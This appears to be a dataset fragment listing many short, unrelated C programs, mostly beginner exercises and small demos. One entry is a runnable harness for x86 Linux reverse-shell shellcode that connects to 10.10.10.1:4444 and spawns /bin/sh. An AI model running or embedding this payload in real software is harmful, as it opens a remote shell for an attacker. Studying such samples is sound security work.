    "#include <stdio.h>\nstatic short newSample = 0, index1 = 0, index2 = 0;\nstatic unsigned short slopeTable[64] =\n{\n 0x0000, 0x0100, 0x0200, 0x0400, 0x0610, 0x0810, 0x0C18, 0x1020,\n 0x0100, 0x0300, 0x0508, 0x0908, 0x0D18, 0x1118, 0x1920, 0x2128,\n 0x0208, 0x0508, 0x0810, 0x0E10, 0x1420, 0x1A20, 0x2628, 0x3230,\n 0x0310, 0x0710, 0x0B18, 0x1318, 0x1B28, 0x2328, 0x2930, 0x4338,\n 0x0418, 0x0918, 0x0E20, 0x1820, 0x2230, 0x2C30, 0x4038, 0x5438,\n 0x0520, 0x0B20, 0x1128, 0x1D28, 0x2938, 0x3538, 0x4D38, 0x6F38,\n 0x0628, 0x0D28, 0x1430, 0x2230, 0x3038, 0x3E38, 0x5A38, 0x7638,\n 0x0730, 0x0F30, 0x1738, 0x2738, 0x3738, 0x4738, 0x6738, 0x7D38\n};\nunsigned char decodeSample(unsigned char nibble)\n{\n unsigned char s = index2 | (nibble >> 1);\n index1 = slopeTable[s] >> 8;\n index2 = slopeTable[s] & 0xff;\n newSample += (nibble & 1) ? -index1 : index1;\n if (newSample < 0)\n  newSample = 0;\n if (newSample > 0xff)\n  newSample = 0xff;\n return newSample;\n}\nint main(int argc, char **argv)\n{\n FILE *in, *out;\n if (argc != 3)\n {\n  fprintf((stderr), \"Usage: %s <input> <output>\\n\", argv[0]);\n  return -1;\n }\n if ((in = fopen(argv[1], \"rb\")) == ((void*)0))\n {\n  perror(argv[1]);\n  return -1;\n }\n if ((out = fopen(argv[2], \"wb\")) == ((void*)0))\n {\n  perror(argv[2]);\n  return -1;\n }\n printf(\"Decoding %s to %s...\\n\", argv[1], argv[2]);\n for (;;)\n {\n  int c = fgetc(in);\n  if (c == (-1))\n   break;\n  fputc(decodeSample(c & 0xf), out);\n  fputc(decodeSample(c >> 4), out);\n }\n puts(\"Done!\");\n fclose(in);\n fclose(out);\n return 0;\n}",
    "#include <stdio.h>\n\nint getline_ (char line[], int maxline);\nint trim (char line[], int maxline);\nint main ()\n{\n  char line[1000];\n  int i;\n  while (getline_(line, 1000) > 0)\n    if (trim(line, 1000) != -1)\n      printf(\"%s\\n\", line);\n  return 0;\n}\nint getline_ (char s[], int lim)\n{\n  int c, i;\n  for (i = 0; i < lim-1 && (c = getchar()) != (-1) && c != '\\n'; i++)\n    s[i] = c;\n  s[i] = '\\0';\n  return i;\n}\nint trim (char s[], int lim)\n{\n  int i, last;\n  last = -1;\n  for (i = 0; i < lim-1 && s[i] != '\\0'; i++)\n    if (!(s[i] == ' ' || s[i] == '\\t' || s[i] == '\\n'))\n      last = i;\n  s[last+1] = '\\0';\n  return last;\n}",
    "#include <stdio.h>\nvoid seatAmount(int id)\n{\n    int dept;\n    dept = (id / 1000) % 100;\n    switch (dept)\n    {\n    case 11:\n    case 12:\n    case 13:\n    case 14:\n    case 15:\n        printf(\"80\");\n        break;\n    default:\n        printf(\"40\");\n        break;\n    }\n}\nint main(int argc, char const *argv[])\n{\n    int id;\n    scanf(\"%d\", &id);\n    seatAmount(id);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nint main(int argc, char* argv[]){\n if(argc != 2){\n  printf(\"Usage: ./runfile <assembly file>\\n\");\n  printf(\"Example) ./runfile ./sample_input/example1.s\\n\");\n  exit(0);\n }\n else\n {\n  char *file=(char *)malloc(strlen(argv[1])+3);\n  strncpy(file,argv[1],strlen(argv[1]));\n  if(freopen(file, \"r\",(stdin))==0){\n   printf(\"File open Error!\\n\");\n   exit(1);\n  }\n  file[strlen(file)-1] ='o';\n  freopen(file,\"w\",(stdout));\n  printf(\"Hello World!\\n\");\n }\n return 0;\n}",
    "int printf(const char *, ...);\n\n\n\n\n\nstatic int n = 11;\nint main(void) {\n int a = 2 + 1;\n int b = 2 + 1;\n int c = (0 + a);\n return printf(\"\" \"hello\" \"c\" \"world\") + printf(\"%d, %d, %d, %d\\n\", a, b, c, n);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <errno.h>\nint main (int argc, char *argv[])\n{\n  char *fnam = argv[0];\n  FILE *f;\n  if (argv[0][0] != '/')\n    {\n      fnam = malloc (strlen (argv[0]) + 2);\n      if (fnam == ((void*)0))\n abort ();\n      strcpy (fnam, \"/\");\n      strcat (fnam, argv[0]);\n    }\n  f = fopen (fnam, \"rb\");\n  if (f == ((void*)0))\n    abort ();\n  fclose(f);\n  if (fopen (\"/nonexistent\", \"rb\") != ((void*)0)\n      || errno != (44))\n    abort ();\n  printf (\"pass\\n\");\n  return 0;\n}",
    "#include<stdio.h>\n#include<malloc.h>\n#include<string.h>\n\nint add_two_char(char a, char b){\n return (int)(a + b - 96);\n}\nvoid add(char *c1, char *c2, char *res){\n int prev = 0;\n while(*c1 || *c2 || prev){\n  char a = (*c1 ? *c1 : '0'), b = (*c2 ? *c2 : '0');\n  int result = add_two_char(a, b) + prev;\n  *res = (char)(result % 10 + 48);\n  prev = result / 10;\n  c1++; c2++; res++;\n }\n}\nvoid reverse(char *c1){\n char* start = c1;\n while(*c1) c1++;\n c1--;\n while(start < c1){\n  char ch = *start;\n  *start = *c1;\n  *c1 = ch;\n  start++;\n  c1--;\n  }\n}\nint main(){\n    char *c1, *c2, *res;\n c1 = (char *)malloc(16384 * sizeof(char));\n c2 = (char *)malloc(16384 * sizeof(char));\n res = (char *)malloc(16384 * sizeof(char));\n memset(c1, 0, 16384 * sizeof(char));\n memset(c2, 0, 16384 * sizeof(char));\n    memset(res, 0, 16384 * sizeof(char));\n scanf(\"%s\", c1);\n scanf(\"%s\", c2);\n reverse(c1);\n reverse(c2);\n add(c1, c2, res);\n reverse(res);\n printf(\"%s\", res);\n free(c1);\n free(c2);\n free(res);\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int num;\n    const int NUMBER = 100;\n    printf(\"     n      cubbed\\n\");\n    for (num = 0; num <= NUMBER; num++)\n printf(\"    %d    %d\\n\", num, num*num*num);\n    return 0;\n}",
    "#include<stdio.h>\nvoid up_and_down(int);\nint main(void)\n{\n    printf(\"Initial state, please check /proc/PID/maps!\\n\");\n    getchar();\n    up_and_down(1);\n    return 0;\n}\nvoid up_and_down(int n)\n{\n    int var_in_stack_frame[64*1024];\n    printf(\"Level %d:n location %p\\n\",n,&n);\n    getchar();\n    if(n<3)\n        up_and_down(n+1);\n    printf(\"Level %d:n location %p\\n\",n,&n);\n    getchar();\n    return;\n}",
    "#include <stdio.h>\nint a;\nfloat b, c;\nint main(){\n scanf(\"%d %f\", &a, &b);\n c = b;\n if(a != 0 && a%5 == 0 && a < b && b-(a+0.5) >= 0){\n  c -= a+0.5;\n }\n printf(\"%.2f\\n\", c);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid seperate(char * ori, char * sub) {\n  int counter = 0;\n  while(*(ori + counter) != ' '){\n    *(sub + counter) = *(ori + counter);\n    counter++;\n    printf(\"%c\", *(sub + counter));\n  }\n  return;\n}\nint main(int argc, char const *argv[]) {\n  FILE *fp;\n  char str[1000];\n  char filename[] = \"./Q3.txt\";\n  fp = fopen(filename, \"r\");\n  if(fp == ((void*)0)) {\n    printf(\"NI\");\n    return 1;\n  }\n  int counter = 0;\n  double error[10000];\n  while(fgets(str, 1000, fp) != ((void*)0)) {\n    char time[150];\n    char m[150];\n    char e[150];\n    char * ori = str;\n    seperate(ori, time);\n    ori = ori + strlen(time) + 1;\n    seperate(ori, m);\n    ori = ori + strlen(m) + 1;\n    seperate(ori, e);\n    double doubleM = atof(m);\n    double doubleE = atof(e);\n    error[counter] = doubleM - doubleE;\n    printf(\"\\n STR %s\", str);\n    printf(\"%lf %lf\\n\", doubleM, doubleE);\n    printf(\"error %lf\\n\", doubleM - doubleE );\n    counter++;\n  }\n  counter = counter - 1;\n  for (int i = 0; i < counter; i++) {\n  }\n  printf(\"\\n%d\\n\", counter);\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nint main(){\n    float angulo, distanciaArvore, alturaElfo;\n    float alturaArvore, qntdCordao;\n    while (scanf(\"%f %f %f\", &angulo, &distanciaArvore, &alturaElfo) != (-1)){\n        alturaArvore = tan(angulo * (3.141592654 / 180.0)) * distanciaArvore + alturaElfo;\n        qntdCordao = alturaArvore * 5.0;\n        printf(\"%.2f\\n\", qntdCordao);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nuint64_t SECRET(uint64_t input) {\n    int i = 0;\n    while (input /= 2048)\n        i += 1;\n    return i;\n}\nint main(int argc, char **argv) {\n    if (argc < 2) {\n        printf(\"Call this program with 1 arguments\\n\");\n        return 1;\n    }\n    printf(\"%lu\\n\", SECRET(strtoul(argv[1], 0, 10)));\n    return 0;\n}",
    "#include <stdio.h>\nint p;\nint n;\nint g[111];\nint gm[4];\nint min(int a,int b) {\n return a<b?a:b;\n}\nvoid solve() {\n int i,r=0,j;\n scanf(\"%d %d\",&n,&p);\n for(i=0;i<n;i++) scanf(\"%d\",&g[i]);\n for(i=0;i<p;i++) gm[i]=0;\n for(i=0;i<n;i++) gm[g[i]%p]++;\n r=gm[0]; gm[0]=0;\n if(p==2) {\n  j=gm[1]/2; r+=j; gm[1]-=j*2;\n } else if(p==3) {\n  j=min(gm[1],gm[2]); r+=j; gm[1]-=j; gm[2]-=j;\n  j=gm[1]/3; r+=j; gm[1]-=j*3;\n  j=gm[2]/3; r+=j; gm[2]-=j*3;\n } else {\n  j=min(gm[1],gm[3]); r+=j; gm[1]-=j; gm[3]-=j;\n  j=gm[2]/2; r+=j; gm[2]-=j*2;\n  j=min(gm[1]/2,gm[2]); r+=j; gm[1]-=j*2; gm[2]-=j;\n  j=min(gm[3]/2,gm[2]); r+=j; gm[3]-=j*2; gm[2]-=j;\n  j=gm[1]/4; r+=j; gm[1]-=j*4;\n  j=gm[3]/4; r+=j; gm[3]-=j*4;\n }\n for(i=0;i<p;i++) if(gm[i]) { r++; break; }\n printf(\"%d\\n\",r);\n}\nint main() {\n int T,caseno=1;\n scanf(\"%d\",&T);\n while(T--) printf(\"Case #%d: \",caseno++),solve();\n return 0;\n}",
    "#include<stdio.h>\nvoid removeEqual(int v[],int tam){\n    int unique[tam];\n    for(int i=0;i<tam;i++){\n        unique[i] = v[i];\n    };\n    for(int i=0;i<tam;i++){\n        for(int j=1;j<tam;j++){\n            if(unique[i] == v[j]){\n                v[j] = 0;\n            }\n        }\n    }printf(\"\\n\");\n    for(int i=0;i<tam;i++){\n        if(v[i]!=0){\n            printf(\"%d \",v[i]);\n        }\n    }\n}\nint main(void){\n    int tam;\n    scanf(\"%d\",&tam);\n    int v[tam];\n    for(int i=0;i<tam;i++){\n        scanf(\"%d\",&v[i]);\n    }\n    removeEqual(v,tam);\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n int marks[10],num;\n float sum=0;\n printf(\"Enter number of elements: \");\n scanf(\"%d\",&num);\n for(int i=1; i<=num; i++)\n { printf(\"\\nEnter number %d : \",i);\n  scanf(\"%d\",&marks[i]);\n  sum += marks[i];\n }\n float average =sum/num;\n printf(\"The average is %f\", average);\n return 0;\n}",
    "#include <stdio.h>\nint a;\nint *pb;\nint main(){\n int b;\n int *pa;\n pa=&a;\n pb=&b;\n printf(\"addr_of_a =%p\\n\",&a);\n printf(\"addr_of_b =%p\\n\",&b);\n printf(\"data_in_pa=%p\\n\",pa);\n printf(\"data_in_pb=%p\\n\",pb);\n printf(\"the size of pa=%ld\\n\",sizeof(pa));\n printf(\"the size of pb=%ld\\n\",sizeof(pb));\n printf(\"addr_of_pa=%p\\n\",&pa);\n printf(\"addr_of_pb=%p\\n\",&pb);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int i,a[2]={2,9};\n unsigned n;\n while (scanf(\"%d\",&n)!=(-1))\n {\n  for (i=1;n!=1;i=1-i)\n  {\n   if (n%a[i]==0)\n    n/=a[i];\n   else n=n/a[i]+1;\n  }\n  if (i==0)\n   printf(\"Stan wins.\\n\");\n  else printf(\"Ollie wins.\\n\");\n }\n return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\nint main(int argc, char* argv[]) {\n    if (argc < 2) {\n        printf(\"unlink: missing argument\\n\");\n        return 0;\n    }\n    printf(\"unlink %s\\n\", argv[1]);\n    return unlink(argv[1]);\n}",
    "#include<stdio.h>\nvoid degerdegis(int a,int b){\n int gecici=a;\n a=b;\n b=gecici;\n printf(\"a: %d  b: %d\\n\",a,b);\n}\nint main(){\n int x=5,y=10;\n degerdegis(x,y);\n printf(\"x: %d  y: %d\\n\",x,y);\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n    int a[5]={50,5,14,60,30};\n    int j,temp;\n    for(int i=1;i<5;i++)\n    {\n        temp=a[i];\n        j=i-1;\n        while(j>=0&&a[j]<temp)\n        {\n            a[j+1]=a[j];\n            j--;\n        }\n        a[j+1]=temp;\n    }\n    return 0;\n}",
    "#include <unistd.h>\nint main(void)\n{\n    _exit(42);\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n\nvoid print_chunk(unsigned int * ptr, unsigned int len)\n{\n    printf(\"[ prev - 0x%08x ][ size - 0x%08x ][ data buffer (0x%08x) -------> ... ] - from malloc(%d)\\n\", *(ptr-2),\n\n            *(ptr-1),\n            (unsigned int)ptr,\n            len);\n}\nint main()\n{\n    unsigned int * ptr[15];\n    unsigned int lengths[] = {0, 4, 8, 16, 24, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384};\n    int i;\n    printf(\"mallocing...\\n\");\n    for(i = 0; i < 15; i++)\n        ptr[i] = malloc(lengths[i]);\n    for(i = 0; i < 15; i++)\n        print_chunk(ptr[i], lengths[i]);\n    return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nunsigned char code[] = \"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\"\n\n\"\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x0a\\x0a\\x0a\\x01\\x68\"\n\"\\x02\\x00\\x11\\x5c\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\"\n\"\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\"\n\"\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\nint main()\n{\n    int (*ret)() = (int(*)())code;\n    ret();\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nFILE *arquivo;\nint main()\n{\n    int vet[3];\n    arquivo=fopen(\"file.bin\", \"wb\");\n    for (int i = 0; i < 3; i++)\n    {\n        printf(\"Digite um numero: \");\n        scanf(\"%d\", &vet[i]);\n    }\n    fwrite(&vet, sizeof(int), 3, arquivo);\n    fclose(arquivo);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n  int n, m;\n  m = 7;\n  printf (\"100\u307e\u3067\u306e%d\u306e\u500d\u6570\\n\", m);\n  for (n = m; n <= 100; n += m) {\n    printf (\"%d\\n\", n);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n  int CurrentHeadPosition,MaxNumTracks,QueueElements;\n  printf(\"Enter the current head position:\");\n  scanf(\"%d\",&CurrentHeadPosition);\n  printf(\"\\nEnter the Maximum number of the tracks:\");\n  scanf(\"%d\",&MaxNumTracks);\n  printf(\"\\nEnter number of elements into the queue:\");\n  scanf(\"%d\",&QueueElements);\n  printf(\"\\nEnter Disk tracks elements:\\n\");\n  int queue[QueueElements],count1=0,count2=0,seekTime=0,TotalSeekTime=0;\n  while(count1<QueueElements)\n  {\n    int value;\n    scanf(\"%d\",&value);\n    if(value>0 && value <=MaxNumTracks)\n      queue[count1] = value;\n    else\n      printf(\"\\n***Sth goes wrong***\\n\");\n    count1++;\n  }\n  while(count2<QueueElements)\n  {\n    seekTime = abs(CurrentHeadPosition - queue[count2]);\n    printf(\"%d--(%d)-->%d\\n\",CurrentHeadPosition,seekTime,queue[count2]);\n    CurrentHeadPosition = queue[count2];\n    count2++;\n    TotalSeekTime +=seekTime;\n  }\n  printf(\"Total Seek time is equal to:%d\\n\",TotalSeekTime);\n  printf(\"Average Seek time:%.2f\\n\",(float)TotalSeekTime/QueueElements);\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int a = 1, b = 1;\n    int a_post, pre_b;\n    a_post = a++;\n    pre_b = ++b;\n    printf(\"a   a_post   b   pre_b \\n\");\n    printf(\"%1d %5d %5d %5d\\n\", a, a_post, b, pre_b);\n    return 0;\n}",
    "#include <stdio.h>\n\nint main()\n{\n    int counter;\n    counter = 0;\n    while (counter < 5)\n        printf(\"x %d square %d\\n\", counter, ((++counter) * (++counter)));\n    return (0);\n}",
    "#include <stdio.h>\nint main() {\n  printf(\"Ola, mundo!\\n\");\nreturn(0); }",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint main(void)\n{\n    char *s;\n    char *s_aux = malloc(100 * sizeof(char));\n    char sep[8] = {' ', ',', '.', '!', '?', ';', ':'};\n    int count = 0;\n    if(!s_aux) {\n        printf(\"malloc err!\\n\");\n        return -1;\n    }\n    fgets(s_aux, 100, (stdin));\n    if(s_aux[strlen(s_aux) - 1] == '\\n') {\n        s_aux[strlen(s_aux) - 1] = '\\0';\n        s = realloc(s_aux, strlen(s_aux) * sizeof(char));\n    }\n    else {\n        s = realloc(s_aux, (strlen(s_aux) + 1) * sizeof(char));\n    }\n    if(!s) {\n        printf(\"realloc err!\\n\");\n        return -1;\n    }\n    s_aux = ((void*)0);\n    char *p = strtok(s, sep);\n    while(p) {\n        puts(p);\n        count++;\n        p = strtok(((void*)0), sep);\n    }\n    printf(\"Sunt %d cuvinte.\\n\", count);\n    free(s);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\nchar *on = \"0 on\";\nchar *off = \"0 off\";\nint main () {\n  int fd, i;\n  setuid(0);\n  setgid(0);\n  if ((fd = open(\"/proc/acpi/ibm/led\", (0x10000000))) == -1) {\n    return 1;\n  }\n  for (i = 0; i < 10; i++) {\n    write(fd, off, strlen(off));\n    usleep(200000);\n    write(fd, on, strlen(on));\n    usleep(200000);\n  }\n  close(fd);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint pow_int(int a, int b)\n{\n int i=0;\n int total = 1;\n while(b>0)\n {\n  total *= a;\n  b--;\n }\n return total;\n}\nint titleToNumber(char* s) {\n    int length;\n int i = 0;\n int count = 0;\n int total = 0;\n while(s[i]!=0)\n  i++;\n length = i;\n for( i=length-1; i>=0; i--,count++){\n  int v = s[i] - 'A' + 1;\n  if(s[i]>'Z' || s[i]<'A')\n   return -1;\n  total += v*pow_int(26, count);\n }\n return total;\n}\nint main()\n{\n char a[100];\n scanf(\"%s\", a);\n printf(\"%d\\n\", titleToNumber(a));\n}",
    "#include <stdio.h>\n#include <string.h>\n\nvoid solve()\n{\n  int n;\n  scanf(\"%d\", &n);\n  char str[10];\n  int digit[10];\n  memset(digit, 0, sizeof(digit));\n  memset(str, 0, sizeof(str));\n  for (int i = 1; i <= n; i++) {\n    sprintf(str, \"%d\", i);\n    char *p = str;\n    while (*p != '\\0') {\n      digit[*p - '0'] += 1;\n      p++;\n    }\n  }\n  printf(\"%d\", digit[0]);\n  for (int i = 1; i < 10; i++) {\n    printf(\" %d\", digit[i]);\n  }\n  printf(\"\\n\");\n}\nint main()\n{\n  int rnd;\n  scanf(\"%d\", &rnd);\n  for (int i = 0; i < rnd; i++) {\n    solve();\n  }\n}",
    "#include <stdio.h>\n\nint ar0[4];\nint ar1[4];\nint k;\nint l;\nint p;\nint q;\nint main(void)\n{\n    for (k = 0; k < 4; k++)\n    {\n        ar0[k] = 123-2*k;\n        ar1[k] = 5;\n    }\n    k = 55;\n    l = 54;\n    p = 53;\n    q = 52;\n    printf(\"ar1[-1] ist %i\\n\", ar1[-1]);\n    printf(\"ar1[-2] ist %i\\n\", ar1[-2]);\n    printf(\"ar1[-3] ist %i\\n\", ar1[-3]);\n    printf(\"ar1[0] ist %i\\n\", ar1[0]);\n    printf(\"ar1[ARRAY_LEN ] ist %i\\n\", ar1[4]);\n    printf(\"ar1[ARRAY_LEN+1] ist %i\\n\", ar1[4 +1]);\n    ar1[4 +2] = 201;\n    ar1[4 +3] = 202;\n    printf(\"k ist %i\\n\", k);\n    printf(\"l ist %i\\n\", l);\n    printf(\"p ist %i\\n\", p);\n    printf(\"q ist %i\\n\", q);\n    return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nint main(){\n int n, fat=1;\n printf(\"Digite um n\u00famero: \");\n scanf(\"%d\", &n);\n int cont = n;\n while(cont >= 1){\n  fat = fat * cont;\n  cont--;\n }\n printf(\"O Fatorial de %d \u00e9 %d\", n, fat);\n}",
    "#include <math.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <assert.h>\n#include <limits.h>\n#include <stdbool.h>\nint main(){\n    int n;\n    scanf(\"%d\",&n);\n    long arr[n];\n    long sum=0;\n    for(int arr_i = 0; arr_i < n; arr_i++){\n       scanf(\"%ld\",&arr[arr_i]);\n       sum+=arr[arr_i];\n    }\n    printf(\"%ld\",sum);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint pow(int m, int n)\n{\n    if(n==0)\n        return 1;\n    return pow(m,n-1)*m;\n}\nint main()\n{\n    int r;\n    r= pow(2,9);\n    printf(\"%d\",r);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(){\n    float numA, numB;\n    int num = -99;\n    while (num < 10000){\n        numA = sqrt(num + 100);\n        numB = sqrt(num + 268);\n        if( numA == (int) numA && numB == (int)numB){\n            printf(\"\u8fd9\u4e2a\u6570\u662f %d\\n\", num);\n        }\n        num++;\n    }\n    system(\"pause\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint zega(int a, int b, int c)\n{\n    int m, n;\n    m = ((a + b + abs(a - b)) / 2);\n    n = ((m + c + abs(m - c)) / 2);\n    return (n);\n}\nint main()\n{\n    int v1, v2, v3, n;\n    scanf(\"%d %d %d\", &v1, &v2, &v3);\n    n = zega(v1, v2, v3);\n    printf(\"%d eh o maior\\n\", n);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n  float raio,altura,volume;\n  raio = 3;\n  altura = 5;\n  volume = 3.14159 * (raio * raio) * altura;\n  printf(\"O volume do cilindro \u00e9 de %f\\n\",volume);\n  return 0;\n}",
    "int a[1] = { 42 };\nint main() {\n  return ((&a)[0])[0];\n}",
    "#include <stdio.h>\nint main() {\n    printf(\"Hola mundo\\n\");\n}",
    "#include <stdio.h>\nint main()\n{\n int num1,num2,cont1,cont2;\n  num1=0;\n  num2=0;\n  cont1=1;\n  cont2=0;\n scanf(\"%d%d\",&num1,&num2);\n if((1<num1<20)&&(num2<100000))\n {\n  for(cont1=1;cont1<=num2;cont1++)\n  {\n   cont2++;\n         if(cont2==num1)\n   {\n             printf(\"%d\\n\",cont1);\n             cont2=0;\n   }\n         else\n        printf(\"%d \",cont1);\n    }\n }\n    return 0;\n}",
    "#include<stdio.h>\n\nint main() {\n    int c, spaces = 0;\n    while((c = getchar()) != (-1)) {\n        if (c == ' ') {\n            ++spaces;\n            if (spaces == 4) {\n                putchar('\\t');\n            }\n        } else {\n            while (spaces > 0) {\n                putchar(' ');\n                --spaces;\n            }\n            putchar(c);\n        }\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n float valor_horas = 0;\n float horas_trabalhadas = 0;\n printf(\"Insira o total de horas trabalhadas: \");\n scanf(\"%f\",&horas_trabalhadas);\n printf(\"Insira o valor de cada hora trabalhada: \");\n scanf(\"%f\",&valor_horas);\n float salario_bruto = 0;\n float salario_liquido = 0;\n float imposto = 0;\n salario_bruto = valor_horas * horas_trabalhadas;\n salario_liquido = salario_bruto * (1 - 0.25 - 0.11);\n imposto = salario_bruto - salario_liquido;\n printf(\"\\nCom %g horas trabalhadas e cada hora valendo %g, o salario bruto \u00e9 de %g e o salario liquido \u00e9 de %g, enquanto o imposto \u00e9 de %g.\\n\", horas_trabalhadas, valor_horas, salario_bruto, salario_liquido, imposto);\n return 0;\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n    double money;\n    printf(\"\\nEnter an amount: \");\n    scanf(\"%lf\", &money);\n    money = money + (money * 0.05f);\n    printf(\"With tax added: $%.2f\", money);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nchar sentence[] = \"On the dark night, Follow the light and Embrace the shadow which will lead you the way.\";\nchar tens[] = \"        10        20        30        40        50        60   65\";\nchar nums[] = \"123456789012345678901234567890123456789012345678901234567890123456\";\nchar subSentence[200];\nchar *subSentence2;\nint searchString(char source[], char searchString[]) {\n    char *foundAt = strstr(source, searchString);\n    int index = (int) (foundAt - source);\n    if (foundAt == ((void*)0))\n        index = -1;\n    return index;\n}\nint main(int argc, char const *argv[]) {\n    printf(\"%s\\n%s \\n%s\\n\", sentence, tens, nums);\n    printf(\"%s\\n\", &sentence[searchString(sentence, \"night\")]);\n    printf(\"%s\\n\", &sentence[searchString(sentence, \"will\")]);\n    strncpy(subSentence, sentence, 6);\n    printf(\"subSentence=%s\\n\", subSentence);\n    subSentence2 = malloc(200);\n    strncpy(subSentence2, sentence, 6);\n    printf(\"subSentence2=%s\\n\", subSentence2);\n    strncat(subSentence, \"#####\", 5);\n    printf(\"subSentence=%s\\n\", subSentence);\n    strncat(subSentence2, \"#####\", 5);\n    printf(\"subSentence2=%s\\n\", subSentence2);\n    return 0;\n}",
    "#include<stdio.h>\n\nint read_array(int arr[])\n{\n    int i, n;\n    scanf(\"%d\", &n);\n    for (i = 0; i < n; i++)\n        scanf(\"%d\", &arr[i]);\n    return n;\n}\nint present(int arr[], int n, int elt) {\n    int i;\n    for (i = 0; i < n; i++) {\n        if (arr[i] == elt) {\n            return 1;\n        }\n    }\n    return 0;\n}\nint main() {\n    int arr1[20], n1;\n    int arr2[20], n2;\n    n1 = read_array(arr1);\n    n2 = read_array(arr2);\n    int i, small_np = 0, flag = 0;\n    for (i = 0; i < n1; i++) {\n        if (!present(arr2, n2, arr1[i])) {\n            if (!flag || (small_np > arr1[i]) ) {\n                flag = 1;\n                small_np = arr1[i];\n            }\n        }\n    }\n    if (flag) {\n        printf(\"%d\", small_np);\n    } else {\n        printf(\"NO\");\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int a,b;\n    scanf(\"%d %d\",&a,&b);\n    printf(\"%d\",a%b);\n}",
    "#include <stdio.h>\nint main (void)\n{\n    int size;\n    printf(\"Enter the size of the array: \");\n    scanf(\"%d\",&size);\n    int array[size];\n    for (int i = 0; i < size; i++)\n    {\n        printf(\"Eneter elemet[%d]: \",i);\n        scanf(\"%d\",&array[i]);\n    }\n    int min = array[0],max = array[0];\n    for (int i = 1; i < size; i++)\n    {\n        if (array[i]>max)\n        {\n            max = array[i];\n        }\n        if (array[i]<min)\n        {\n            min = array[i];\n        }\n    }\n    printf(\"The minimum value is %d and maximum value is %d\",min,max);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(int argc, char *argv[])\n{\n  double p = 10000,\n           yr = 6,\n           r,\n           n = 4,\n           power,\n           amount;\n    n *= 12.0;\n    r = yr / 1200.0;\n    power = exp(n * log(1.0 + r));\n    amount = p * ((r * power) / (power - 1.0));\n    printf(\"Fixed monthly amount: $%.2lf\\n\", amount);\n    return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nint main(){\n printf(\"%.8f\\n\",1+2*sqrt(3)/(5-0.1));\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main()\n{\n    int pdesk[2];\n    pipe(pdesk);\n    if (fork() == 0)\n    {\n        write(pdesk[1], \"Hallo!\", 7);\n        exit(0);\n    }\n    else\n    {\n        char buf[10];\n        read(pdesk[0], buf, 10);\n        read(pdesk[0], buf, 10);\n        printf(\"Read from pipe: %s\\n\", buf);\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    char *s = \" 17  25 \";\n    char *test;\n    int con = strtol(s, &test, 10);\n    int con1 = strtol(test, &test, 10);\n    printf(\"The value of con and con1: %d, %d\\n\", con, con1);\n}",
    "#include <stdio.h>\nint main()\n{\n    float sal[13];\n    float total;\n    int i;\n    for (i=1; i<=12; i++)\n      {\n          printf(\"Introduza o sal\u00e1rio do m\u00eas %d: \", i);\n          scanf(\"%f\", &sal[i]);\n      }\n      puts(\" M\u00eas        Valor \");\n      for(i = 1, total=0.0; i<=12; i++)\n        {\n            printf(\" %3d    %9.2f\\n\",i, sal[i]);\n            total+=sal[i];\n        }\n    printf(\"Total Anual: %9.2f\\n\",total);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n for(int i=0;i<argc;i++)\n {\n  printf(\"%s\\n\",argv[i]);\n }\n return 0;\n}",
